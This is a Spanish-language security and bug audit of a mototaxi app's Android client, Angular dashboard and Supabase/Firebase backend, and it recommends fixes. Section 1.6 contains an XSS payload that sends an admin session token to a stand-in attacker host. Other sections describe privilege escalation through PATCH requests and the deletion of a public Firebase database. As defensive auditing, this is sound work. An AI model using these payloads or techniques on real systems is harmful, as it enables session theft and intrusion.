# Análisis Integral de Seguridad y Funcionamiento: TucTuc Map

Este documento presenta una auditoría técnica profunda de los tres componentes del ecosistema **TucTuc Map** (**App Android** en `tuctucMap/`, **Dashboard Web Angular** en `tuctucMapDashboard/` y **Base de Datos Supabase/Firebase** en `databaseTuctucApp/`), evaluados específicamente bajo tu modelo de negocio: **monetización por suscripción prepagada de conductores de mototaxis ("toritos") y pago 100% en efectivo directo entre pasajero y conductor en municipios y pueblos**.

---

## Parte 1: Vulnerabilidades Críticas y Mejoras de Seguridad

Dado que el ingreso del dueño de la plataforma depende exclusivamente de que los conductores paguen su cuota (semanal, quincenal o mensual) para aparecer en el mapa y recibir viajes, **la prioridad #1 de seguridad es impedir que un conductor pueda activarse o extender su suscripción sin pagar**, así como proteger la base de datos y el panel administrativo.

### 1.1. [CRÍTICO] Escalación de Privilegios y Auto-Renovación Gratuita en Supabase (RLS)
* **Ubicación:** `databaseTuctucApp/db.sql` (líneas 56–68) y `tuctucMap/.../SupabaseRepository.kt` (líneas 82–103).
* **Problema actual:**
  1. En `public.profiles`, la política RLS `"Users can update their own profile"` (`USING (auth.uid() = id)`) permite al usuario autenticado actualizar **cualquier columna** de su fila, incluyendo `role`, `approval_status` y `subscription_end_date`.
  2. En `public.driver_subscriptions`, existe la política `"Drivers can insert their own subscriptions"` (`WITH CHECK (auth.uid() = driver_id)`), creada originalmente para que la app Android inserte los 7 días de prueba al registrarse.
* **Riesgo para el negocio:**
  * Un usuario con conocimientos técnicos básicos (extrayendo el `SUPABASE_KEY` público del APK o del Dashboard) puede enviar una petición HTTP `PATCH /rest/v1/profiles` con su propio token y asignarse `subscription_end_date = '2099-12-31'` (suscripción gratis de por vida) o peor aún, cambiarse `role = 'admin'` y entrar al Dashboard Angular con control total del negocio.
* **Cómo solucionarlo:**
  * **Proteger columnas sensibles con un Trigger en PostgreSQL:** Crear un trigger `BEFORE UPDATE ON public.profiles` que lance una excepción si el usuario actual no es `admin` e intenta modificar `role`, `approval_status` o `subscription_end_date`.
  * **Eliminar la inserción de suscripciones desde el cliente:** Borrar la política `"Drivers can insert their own subscriptions"` en `public.driver_subscriptions` y mover el otorgamiento de los 7 días de prueba a una función o trigger seguro en el servidor PostgreSQL usando `NOW()`.

```sql
-- Ejemplo de Trigger para blindar columnas críticas en public.profiles
CREATE OR REPLACE FUNCTION public.protect_profile_sensitive_columns()
RETURNS TRIGGER AS $$
BEGIN
  IF (SELECT role FROM public.profiles WHERE id = auth.uid()) IS DISTINCT FROM 'admin' THEN
    NEW.role := OLD.role;
    NEW.approval_status := OLD.approval_status;
    NEW.subscription_end_date := OLD.subscription_end_date;
  END IF;
  RETURN NEW;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER SET search_path = public;
```

---

### 1.2. [CRÍTICO] Evasión de Vencimiento Cambiando la Fecha del Teléfono (Clock Tampering)
* **Ubicación:** `tuctucMap/.../data/model/Driver.kt` (líneas 38–48), `MainActivity.kt` (líneas 109–111) y `DriverHomeScreen.kt` (línea 321).
* **Problema actual:**
  * La app Android decide si la suscripción del conductor está vencida comparando `subscription_end_date` contra el reloj local del teléfono (`System.currentTimeMillis() > expiryMs`).
  * Además, durante el registro (`SupabaseRepository.kt`, línea 82), los 7 días de prueba se calculan con `java.time.Instant.now()` del teléfono.
* **Riesgo para el negocio:**
  * En cuanto a un conductor se le vence su semana de Q25, le basta con ir a **Ajustes de Android → Fecha y Hora**, desactivar la hora automática y atrasar el calendario de su celular un mes. La app evaluará `isSubscriptionExpired = false` y lo dejará trabajar gratis indefinidamente.
  * Del mismo modo, si adelanta su reloj al año 2028 antes de crear su cuenta, registrará en Supabase una fecha de prueba hasta el 2028.
* **Cómo solucionarlo:**
  1. **En el Backend (Supabase):** Configurar una tarea programada diaria o por hora con `pg_cron` en Supabase que ejecute:
     ```sql
     UPDATE public.profiles
     SET approval_status = 'suscripcion_vencida'
     WHERE role = 'driver'
       AND approval_status = 'aprobado'
       AND subscription_end_date < NOW();
     ```
  2. **En la App Android:** Obtener el desfase de tiempo real desde Firebase Realtime Database (`.info/serverTimeOffset`) o desde la cabecera `Date` de Supabase para calcular la hora real del servidor sin confiar jamás en el reloj manual del teléfono.
  3. **Evitar multicuentas infinitas de prueba:** Añadir restricción `UNIQUE` (normalizando mayúsculas y guiones) sobre `plate_number` y `phone` para que un mismo torito no pueda borrar su cuenta o usar otro correo cada 7 días para tener pruebas gratis infinitas.

---

### 1.3. [CRÍTICO] Contraseña Maestra de Base de Datos Expuesta en el Repositorio
* **Ubicación:** `databaseTuctucApp/run_sql.js` (líneas 12–18).
* **Problema actual:**
  * El archivo contiene en texto plano el host directo de Supabase y la contraseña del superusuario `postgres`.
* **Riesgo:**
  * El usuario `postgres` salta todas las reglas RLS (`BYPASSRLS`). Si el repositorio se respalda en la nube o alguien accede a esa carpeta, tiene control destructivo total sobre la base de datos.
* **Cómo solucionarlo:**
  * Cambiar la contraseña de la base de datos en **Supabase Dashboard → Settings → Database**.
  * Leer las credenciales desde variables de entorno (`process.env.DB_PASSWORD` mediante un archivo `.env` incluido en `.gitignore`).

---

### 1.4. [ALTO] Firebase Realtime Database Abierta sin Reglas de Validación ni Autenticación
* **Ubicación:** `tuctucMapDashboard/src/app/services/supabase.service.ts` (línea 240: `fetch('https://tuctucmap-default-rtdb.firebaseio.com/driver_locations.json')`) y `tuctucMap/.../SupabaseRepository.kt` (líneas 297, 561).
* **Problema actual:**
  * La autenticación de usuarios se realiza en **Supabase Auth**, pero la telemetría GPS (`driver_locations`) y el despacho de viajes en vivo (`trips`) se leen y escriben en **Firebase Realtime Database** sin sesión de Firebase Auth (las lecturas y escrituras son públicas).
* **Riesgo:**
  * Cualquier persona que conozca la URL `https://tuctucmap-default-rtdb.firebaseio.com/driver_locations.json` o `/trips.json` puede:
    * Descargar en tiempo real la ubicación, teléfono y placas de toda tu flota.
    * Hacer una petición `DELETE` a `/driver_locations.json` y borrar a todos los toritos del mapa.
    * Inyectar cientos de toritos o solicitudes de viaje falsas para colapsar a los conductores.
* **Cómo solucionarlo:**
  1. **Corto plazo (sin cambiar arquitectura):** Configurar **Firebase Security Rules** con validaciones estrictas de esquema (`.validate`) que impidan borrar el nodo raíz `/driver_locations` o `/trips`, exijan tipos de datos exactos (coordenadas dentro del rango de Guatemala `lat >= 13.7 && lat <= 17.9`, `lon >= -92.3 && lon <= -88.1`, longitudes máximas de texto en `nombre`, `placas`, `message`), y restringir la `api_key` de Firebase en Google Cloud Console exclusivamente al paquete Android (`com.tuctucmap.app` + huella SHA-1) y al dominio del Dashboard.
  2. **Mediano plazo:** Unificar la seguridad firmando un token o usando **Supabase Realtime (Broadcast/Presence)** para no depender de dos nubes con sistemas de autenticación separados.

---

### 1.5. [ALTO] Exposición Pública de Todos los Perfiles en `public.profiles`
* **Ubicación:** `databaseTuctucApp/db.sql` (línea 55).
* **Problema actual:**
  * La política `CREATE POLICY "Profiles viewable by everyone" ON public.profiles FOR SELECT USING (true);` permite que cualquier cliente (incluso sin iniciar sesión, usando la `anon` key pública) consulte toda la tabla `profiles`.
* **Riesgo:**
  * Un competidor local puede ejecutar una consulta simple a la API REST de Supabase y extraer en 1 segundo el padrón completo de tus conductores (nombres, teléfonos, placas, fechas de vencimiento) y el directorio completo de pasajeros registrados, además de saber qué cuenta tiene `role = 'admin'`.
* **Cómo solucionarlo:**
  * Restringir la política `SELECT` de `profiles` para que:
    * Cada usuario autenticado pueda leer su propio perfil (`auth.uid() = id`).
    * El administrador pueda leer todos los perfiles.
    * Los pasajeros solo puedan consultar campos públicos (`id, name, phone, plate_number`) de perfiles donde `role = 'driver' AND approval_status = 'aprobado'`.

---

### 1.6. [MEDIO] Inyección HTML / XSS en los Popups del Mapa del Dashboard Angular
* **Ubicación:** `tuctucMapDashboard/src/app/features/fleet-map/fleet-map.component.ts` (líneas 489–498) y `trips.component.ts` (líneas 152, 159, 168).
* **Problema actual:**
  * Los popups de Leaflet se construyen concatenando variables directamente en un string HTML:
    ```typescript
    const popupContent = `...<h4>${driver.nombre}</h4>...<b>Placas:</b> ${driver.placas}...`;
    ```
* **Riesgo:**
  * Si un usuario malicioso se registra o envía un viaje como invitado poniendo en su nombre `<img src=x onerror="fetch('https://atacante.com/?t='+localStorage.getItem('sb-doypobovndxkbkikkozq-auth-token'))">`, cuando el administrador haga clic sobre el marcador en el Dashboard, el script se ejecutará en el navegador del administrador y robará su sesión de Supabase.
* **Cómo solucionarlo:**
  * Crear una función utilitaria `escapeHtml(text: string)` en el Dashboard antes de interpolar datos de usuarios dentro de `bindPopup()`, o construir el contenido del popup con nodos DOM seguros (`document.createElement` + `textContent`).

---

### 1.7. [MEDIO] Ofuscación R8 Desactivada y Respaldo en Texto Plano en Android
* **Ubicación:** `tuctucMap/app/build.gradle.kts` (líneas 47–57), `SecurePrefs.kt` (líneas 73–75 y 136–143), y `AndroidManifest.xml` (línea 22).
* **Problemas actuales:**
  1. En `build.gradle.kts`, el bloque `release` tiene `optimization { enable = false }` en lugar de `isMinifyEnabled = true` y `isShrinkResources = true`. Esto deja el código fuente Kotlin compilado sin ofuscar, permitiendo que cualquiera abra el APK con **JADX** y vea toda la lógica, URLs y constantes.
  2. En `SecurePrefs.kt`, si el cifrado AES-GCM falla por cualquier motivo, el bloque `catch` guarda el `accessToken` y `refreshToken` de Supabase **en texto plano** dentro de `SharedPreferences`.
  3. En `MainActivity.kt` (líneas 128–131), `driver_last_approval_status` y `driver_last_sub_end` se guardan en texto plano en `tuctuc_prefs`. En un teléfono con acceso root, el conductor puede editar ese XML local para engañar el arranque en frío sin red.
  4. En `AndroidManifest.xml`, `android:allowBackup="true"` permite extraer las preferencias locales mediante `adb backup`.

---

## Parte 2: Errores Lógicos y Mejoras de Funcionamiento Operativo

Estas mejoras impactan directamente la experiencia diaria de conductores y pasajeros en los pueblos y evitan pérdidas de viajes o cobros injustos.

### 2.1. [BUG CRÍTICO] Un Solo Conductor que Presione "Ignorar (X)" Cancela el Viaje para TODOS los Demás Conductores y para el Pasajero
* **Ubicación:** `tuctucMap/.../ui/screens/driver/DriverHomeScreen.kt` (líneas 1448–1458).
* **Qué está pasando hoy:**
  * Cuando un pasajero presiona **"PEDIR TORITO CERCANO"**, se crea una solicitud broadcast (`driverId = ""`) que aparece simultáneamente en la pantalla de todos los conductores disponibles (por ejemplo, 8 toritos conectados en el pueblo).
  * Si **uno solo** de esos 8 conductores presiona el botón rojo **`X` (Ignorar solicitud)** en su esquina superior derecha porque está ocupado o lejos, el código ejecuta:
    ```kotlin
    repository.saveTripRecord(trip, "rejected")
    repository.updateTripStatus(trip.tripId, "cancelled")
    kotlinx.coroutines.delay(10000)
    repository.deleteTrip(trip.tripId)
    ```
  * **Consecuencia:** ¡Al cambiar el estado global en Firebase a `"cancelled"` y borrar el nodo, **le cancela el viaje inmediatamente al pasajero** y **se lo borra de la pantalla a los otros 7 conductores** que sí estaban a punto de presionar "ACEPTAR VIAJE"!
* **Cómo solucionarlo:**
  * El botón `X` en una solicitud broadcast **nunca debe modificar ni borrar el viaje en Firebase**. Solo debe agregar `trip.tripId` a un `remember { mutableStateSetOf<String>() }` local en el teléfono de ese conductor para ocultarle la tarjeta a él, dejando que los demás conductores del pueblo puedan aceptarlo normalmente.

---

### 2.2. [BUG IMPORTANTE] Duplicación de Viajes en el Historial y Pérdida de Tarifa/Ruta GPS
* **Ubicación:** `PassengerMapScreen.kt` (líneas 1308–1327) y `DriverHomeScreen.kt` (líneas 1335–1348).
* **Qué está pasando hoy:**
  1. Cuando el viaje está en curso (`status == "accepted"`), tanto el pasajero como el conductor tienen un botón para finalizar el viaje.
  2. Si el pasajero presiona **"Finalizar / Cerrar Viaje"**, su app ejecuta `repository.saveTripRecord(current, "completed")` (que hace un `INSERT` en Supabase **sin tarifa `fare`, sin distancia `distance_km` y sin `route_points`**) e inmediatamente ejecuta `repository.deleteTrip(tid)` en Firebase.
  3. Cuando el conductor ingresa el monto cobrado en efectivo (ej. Q10) y presiona **"Guardar y Finalizar"**, su app hace **otro `INSERT`** en Supabase. Resultado: el viaje aparece duplicado en el Dashboard Administrativo (uno vacío y otro con los Q10), o peor aún, si el pasajero era invitado (`guest_*`), su `INSERT` falla por RLS pero igual borra el viaje de Firebase antes de que el conductor termine.
* **Cómo solucionarlo:**
  * Solo el **Conductor** debe insertar el registro final en la tabla `public.trips` de Supabase al confirmar el cobro en efectivo.
  * Si el pasajero presiona "Cerrar Viaje" en su pantalla, solo debe limpiar su estado local en la UI (o cambiar un flag `closedByPassenger = true` en Firebase), sin hacer `INSERT` en Supabase ni borrarle el viaje activo al conductor.

---

### 2.3. [BUG DE NEGOCIO] La Renovación Anticipada le "Roba" Días Pagados al Conductor
* **Ubicación:** `tuctucMapDashboard/src/app/features/drivers/drivers.component.ts` (líneas 356–375) y `supabase.service.ts` (líneas 329–331).
* **Qué está pasando hoy:**
  * En la app Android (`DriverHomeScreen.kt`, línea 323), se muestra un aviso preventivo al conductor cuando le quedan menos de **72 horas (3 días)** para que deposite su renovación a tiempo y no se quede bloqueado.
  * Sin embargo, cuando el conductor paga 2 días antes de su vencimiento y el administrador entra al Dashboard a renovarle el **Plan Semanal (7 días)**, la función `calculatePlanExpiry` hace:
    ```typescript
    const baseDate = new Date(); // ¡Usa la fecha de HOY en vez de la fecha en que vence!
    baseDate.setDate(baseDate.getDate() + 7);
    ```
  * **Consecuencia:** El conductor que pagó puntualmente 2 días antes **pierde esos 2 días que ya tenía pagados**. Esto genera reclamos con los conductores y los incentiva a esperar hasta quedar bloqueados para pagar.
* **Cómo solucionarlo:**
  * Al calcular la nueva fecha de vencimiento en el Dashboard:
    ```typescript
    const currentExpiry = this.data.driver.fechaVencimientoSuscripcion || 0;
    const now = Date.now();
    // Si aún tiene días vigentes, sumar a partir de su vencimiento actual; si ya venció, sumar desde hoy
    const baseDate = new Date(currentExpiry > now ? currentExpiry : now);
    ```

---

### 2.4. [IMPORTANTE] Inconsistencias en el Esquema `db.sql` vs Código de Aplicación
* **Ubicación:** `databaseTuctucApp/db.sql` (líneas 11 y 22).
* **Problemas detectados:**
  1. En `db.sql` (línea 11): `approval_status TEXT DEFAULT 'pending'`, mientras que la app Android y el Dashboard Angular evalúan `'pendiente'`, `'aprobado'`, `'rechazado'` y `'suscripcion_vencida'`.
  2. En `db.sql` (línea 22): `plan_type TEXT CHECK (plan_type IN ('trial', 'semanal', 'quincenal', 'mensual'))`, pero en el Dashboard Angular (`drivers.component.ts`, línea 96) existe la opción `'personalizado'`. Si esa restricción `CHECK` no incluye `'personalizado'`, guardar una fecha personalizada desde el Dashboard dará error en PostgreSQL.

---

### 2.5. [CRÍTICO EN CALLE] Las Solicitudes de Viaje No Suenan si el Conductor Tiene la App en Segundo Plano o Usa Google Maps / WhatsApp
* **Ubicación:** `tuctucMap/.../ui/screens/driver/DriverHomeScreen.kt` (líneas 146–177) vs `service/LocationTrackingService.kt`.
* **Qué está pasando hoy:**
  * El listener de solicitudes entrantes (`observePendingTripsForDriver`), el timbre de notificación y el motor de voz (`TextToSpeech` que dice *"¡Nueva solicitud de viaje!..."*) viven dentro de `DriverHomeScreen.kt` (la interfaz gráfica).
  * **Problema real con los toritos:** En un pueblo, el conductor enciende su turno y luego apaga la pantalla para guardar el teléfono en el bolsillo o abre WhatsApp / Google Maps. En Android, cuando `MainActivity` pasa a segundo plano o el sistema pausa la UI, el `LaunchedEffect` de la pantalla deja de ejecutarse o no despierta la pantalla. El conductor pierde el viaje de 60 segundos sin enterarse.
* **Cómo solucionarlo:**
  * Mover la suscripción `observePendingTripsForDriver` y el motor de voz (`TextToSpeech` + `Vibrator` + sonido de alarma) directamente dentro de **`LocationTrackingService.kt`**.
  * Como `LocationTrackingService` ya es un `ForegroundService` activo, escuchará los viajes aunque la pantalla esté apagada, hablará por el altavoz del conductor y podrá lanzar una notificación emergente de máxima prioridad (`IMPORTANCE_HIGH` con `setFullScreenIntent`) para encender la pantalla automáticamente cuando entre un viaje.

---

### 2.6. [IMPORTANTE] Falta de Filtro por Distancia (Geofencing) para Solicitudes y Mapa
* **Ubicación:** `SupabaseRepository.kt` (líneas 657–689 y 747–798) y `PassengerMapScreen.kt`.
* **Problema actual:**
  * `observeActiveLocations()` descarga todos los conductores activos en Firebase sin importar a cuántos kilómetros estén.
  * `observePendingTripsForDriver()` muestra al conductor todas las solicitudes `"requested"` sin filtrar por cercanía.
* **Consecuencia al crecer a más de un pueblo:**
  * Si tienes conductores en dos municipios a 15 km de distancia, a los conductores del Pueblo A les sonará la alarma con solicitudes del Pueblo B, y un pasajero en un pueblo sin toritos verá en su barra superior *"3 toritos disponibles"* aunque estén en otro municipio.
* **Cómo solucionarlo:**
  * En `PassengerMapScreen.kt`: Filtrar `availableDrivers` considerando únicamente aquellos cuya distancia Haversine al pasajero sea menor a un radio local (ej. `<= 4,000 metros` / `4 km`).
  * En `LocationTrackingService` / `DriverHomeScreen`: Solo anunciar y mostrar solicitudes donde `distanceMetersTo(passengerLat, passengerLon) <= 4_000`.

---

### 2.7. [IMPORTANTE] Teléfono del Administrador (`50230000000`) y Cuentas Bancarias Fijas en el Código
* **Ubicación:** `DriverSubscriptionExpiredScreen.kt` (líneas 250–295) y `DriverHomeScreen.kt` (líneas 1618–1642).
* **Problema actual:**
  * Cuando el conductor presiona **"Enviar Boleta por WhatsApp"** para pagar su suscripción, la app abre un chat al número fijo `"50230000000"`.
  * Asimismo, los números de cuenta de Banrural (`3402-0987-65`), Banco Industrial (`027-019842-1`) y los precios (`Q25`, `Q45`, `Q80`) están escritos de forma estática en las pantallas de Android y Angular.
* **Riesgo operativo:**
  * Si el dueño de la app cambia de número de teléfono de cobros, cambia de cuenta bancaria o lanza una promoción en un pueblo nuevo (ej. Semana a Q15 por lanzamiento), tendría que publicar una actualización del APK y esperar a que todos los conductores actualicen la app.
* **Cómo solucionarlo:**
  * Crear una tabla `public.app_config` en Supabase (con lectura pública `SELECT USING (true)` y escritura solo `admin`) que almacene:
    * `admin_whatsapp_phone`
    * `bank_accounts` (JSON con banco, tipo de cuenta, número y titular)
    * `subscription_plans` (JSON con precios vigentes)
  * Agregar una sección de **"Configuración de Cobros"** en el Dashboard Angular para editar estos datos en vivo sin tocar el código Android.

---

### 2.8. [MEDIO] "Toritos Fantasma" en el Mapa de Flota del Dashboard Angular
* **Ubicación:** `tuctucMapDashboard/src/app/services/supabase.service.ts` (líneas 238–248).
* **Problema actual:**
  * En la app móvil Android (`SupabaseRepository.kt`, línea 781), los conductores que no han enviado un heartbeat GPS en los últimos **3 minutos (`180_000 ms`)** se descartan automáticamente.
  * En cambio, el Dashboard Angular (`getLiveDrivers()`) solo revisa `d && d.active` sin verificar `d.updated_at`.
* **Consecuencia:**
  * En zonas rurales donde el conductor entra a una casa sin señal o se le descarga la batería de golpe (sin que alcance a ejecutarse el `onDisconnect` limpio), su registro en Firebase queda con `active: true` y un `updated_at` de hace horas o días. En el Mapa de Flota del Dashboard seguirá apareciendo como si estuviera circulando en vivo.
* **Cómo solucionarlo:**
  * En `supabase.service.ts` (`getLiveDrivers()`), aplicar exactamente el mismo filtro TTL de 3 minutos:
    ```typescript
    const now = Date.now();
    return Object.values(data).filter((d: any) => {
      if (!d || !d.active) return false;
      const updatedAt = Number(d.updated_at) || 0;
      return updatedAt === 0 || (now - updatedAt) <= 180000;
    }) as LiveDriverLocation[];
    ```

---

### 2.9. [MEDIO] Escalabilidad de Consultas en Supabase (Límite de 1,000 filas)
* **Ubicación:**
  * `tuctucMapDashboard/src/app/services/supabase.service.ts` (`getPassengers()` en línea 217, `getFinancialStats()` en línea 157, `getCompletedTrips()` en línea 251).
  * `tuctucMap/.../DriverHomeScreen.kt` (`refreshTripStats()` en línea 97).
* **Problema actual:**
  * El cliente de Supabase (`postgrest`) devuelve por defecto un máximo de **1,000 registros** por consulta.
  * Hoy, `getFinancialStats()` suma `amount_paid` descargando todas las filas de `driver_subscriptions` al navegador; `getPassengers()` descarga toda la tabla `trips` para contar viajes por pasajero; y en Android, `refreshTripStats()` descarga todos los viajes históricos del conductor solo para contar en Kotlin cuántos empiezan con la fecha de hoy (`created_at.startsWith(todayStr)`).
* **Consecuencia:**
  * Con apenas 20 toritos haciendo 15 viajes diarios (300 viajes al día), en **menos de 4 días** superarás los 1,000 viajes en `public.trips`, provocando que los conteos, el historial y las métricas financieras queden truncados o consuman demasiados datos móviles del conductor.
* **Cómo solucionarlo:**
  * En Android (`refreshTripStats`): Consultar en Supabase filtrando directamente por fecha (`gte("created_at", startOfTodayIso)`) y usando `count(Count.EXACT)`.
  * En el Dashboard Angular: Crear una función RPC en PostgreSQL (`get_dashboard_financial_kpis()`) que ejecute `SUM(amount_paid)` directamente en el motor SQL y devuelva solo el resumen numérico.

---

## Parte 3: Mejoras Estratégicas para el Modelo de Negocio en Pueblos (Efectivo + Suscripciones)

Pensando específicamente en cómo operan los mototaxis/toritos en municipios fuera de la ciudad y cómo maximizar la retención de conductores que pagan suscripción:

1. **Número de Unidad / Padrón del Torito (Más Visible que la Placa):**
   * En la mayoría de pueblos, la gente no identifica al torito por la placa de circulación (`M-123ABC`), sino por el **Número de Torito pintado en el techo o frente** (ej. **Torito #14**, **Torito #08**) o su color/asociación.
   * **Mejora:** Añadir el campo `unit_number` (ej. *"Torito #14"*) en el registro y mostrarlo en tamaño grande tanto en el marcador del mapa como en la tarjeta de "¡Torito en Camino!".

2. **Aprobación Inicial Controlada por el Administrador vs Auto-Aprobación:**
   * Aunque existe la pantalla `DriverPendingScreen.kt` ("Cuenta en Revisión") y el tab "Pendientes" en el Dashboard, actualmente `registerDriver()` en `SupabaseRepository.kt` (línea 93) inserta a todos los conductores nuevos directamente con `"approval_status" to "aprobado"`.
   * **Mejora:** En pueblos pequeños, la seguridad y confianza de los vecinos es clave. Conviene que el dueño de la app decida si el registro entra como `'pendiente'` (para verificar que realmente tiene un torito y darle sus 7 días de prueba al aprobarlo) o si activa los 7 días únicamente tras validar su número de teléfono/DPI.

3. **Envío de Número de Boleta desde la App del Conductor:**
   * Actualmente el conductor envía la foto de la boleta por WhatsApp y el administrador tiene que buscarlo manualmente en la tabla del Dashboard para renovarle.
   * **Mejora:** En la pantalla `DriverSubscriptionExpiredScreen.kt` (y en el diálogo de "Renovar"), agregar un pequeño formulario donde el conductor elija su plan (Semanal Q25 / Quincenal Q45 / Mensual Q80), escriba el **Número de Boleta/Referencia** y presione *"Notificar Pago"*. Esto puede crear una solicitud `status = 'por_verificar'` que aparezca como una alerta destacada en la parte superior del Dashboard Angular para que el administrador la apruebe con **un solo clic** mientras revisa su WhatsApp o banca en línea.

4. **Protección contra Solicitudes Falsas ("Bromistas") en Modo Invitado:**
   * Permitir pedir toritos sin registrarse es excelente para pueblos donde las personas mayores o con poca experiencia digital no usan correo electrónico.
   * Sin embargo, para evitar que alguien envíe solicitudes falsas de broma haciendo gastar gasolina al conductor:
     * Validar que el teléfono ingresado en modo invitado tenga formato válido de 8 dígitos (en Guatemala empezando con `3`, `4`, `5` o `2`).
     * Guardar un identificador único de instalación en el dispositivo que impida enviar otra solicitud mientras ya tiene una activa, y permitir al conductor marcar un número como *"Pasajero no salió / Broma"* para alertar a otros conductores si ese mismo número vuelve a pedir.

---

## Resumen de Prioridades de Implementación Sugeridas

| Prioridad | Categoría | Acción Recomendada | Impacto |
| :---: | :--- | :--- | :--- |
| **1 (Inmediata)** | Seguridad BD | Rotar contraseña en `run_sql.js`, aplicar Trigger en `profiles` para proteger `role`/`approval_status`/`subscription_end_date` y restringir `SELECT` público en `profiles`. | Evita hackeo del panel admin y suscripciones gratis ilegítimas. |
| **2 (Inmediata)** | Bug Operativo | Corregir el botón `X` (Ignorar) en `DriverHomeScreen.kt` para que no cancele ni borre en Firebase las solicitudes broadcast para los demás conductores. | Evita que 1 conductor cancele los viajes de toda la flota. |
| **3 (Inmediata)** | Bug Cobranza | Corregir `calculatePlanExpiry` en el Dashboard Angular para sumar los 7/15/30 días a partir de la fecha de vencimiento vigente (si aún no ha expirado). | Evita quitarle días pagados a los conductores puntuales. |
| **4 (Alta)** | Operación en Calle | Mover el detector de solicitudes y la alerta de voz (TTS) al `LocationTrackingService` y sincronizar la hora con el servidor. | Garantiza que el conductor escuche viajes con la pantalla apagada y no pueda atrasar el reloj del celular. |
| **5 (Alta)** | Configuración | Reemplazar el teléfono fijo `50230000000` por configuración dinámica desde Supabase y activar R8 (`isMinifyEnabled = true`) en Release. | Permite que las boletas de WhatsApp lleguen al número real del dueño y protege el APK. |
| **6 (Media)** | Escalabilidad | Añadir filtro de radio en km (Geofencing), filtro de 3 min en el mapa del Dashboard, escapar HTML en popups de Leaflet y evitar el doble `INSERT` en `trips`. | Datos limpios, cero duplicados y preparación para operar en múltiples pueblos. |
